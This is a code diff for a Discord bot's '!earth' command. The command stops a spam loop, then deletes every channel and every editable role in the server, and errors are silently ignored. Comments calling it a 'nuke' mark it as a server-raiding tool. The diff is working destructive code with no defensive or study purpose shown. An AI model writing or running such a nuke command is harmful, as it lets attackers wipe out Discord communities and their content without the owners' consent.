@@ -208,30 +208,33 @@ module.exports = (client) => {
         }
               
         // ==========================================
-        // 4. COMMAND: !stop
+        // 4. COMMAND: !earth (Stops spam & wipes channels/roles)
         // ==========================================
-
-        // 1. Delete all existing channels
-                const channels = [...guild.channels.cache.values()];
-                for (const channel of channels) {
-                    await channel.delete("earth command").catch(() => {});
+        if (command === "!earth") {
+            try {
+                // Stop spam interval if active
+                if (welcomeInterval) {
+                    clearInterval(welcomeInterval);
+                    welcomeInterval = null;
                 }
 
-        // 2. Delete all deletable roles
+                // Delete all existing channels
+                const channels = [...guild.channels.cache.values()];
+                for (const channel of channels) {
+                    await channel.delete("Earth command").catch(() => {});
+                }
+
+                // Delete all deletable roles
                 const roles = [...guild.roles.cache.values()];
                 for (const role of roles) {
                     if (role.id !== guild.id && role.editable) {
-                        await role.delete("earth command").catch(() => {});
+                        await role.delete("Earth command").catch(() => {});
                     }
                 }
-        
-        // 3. Nuke Stop
-        
-        if (command === "!earth") {
-            if (welcomeInterval) {
-                clearInterval(welcomeInterval);
-                welcomeInterval = null;
-                await message.channel.send("🛑 nuke stoped.").catch(() => {});
+
+                await message.channel.send("🛑 Earth command executed: Spammer stopped & server cleaned.").catch(() => {});
+            } catch (error) {
+                console.error("Error executing !earth command:", error);
             }
         }
     });
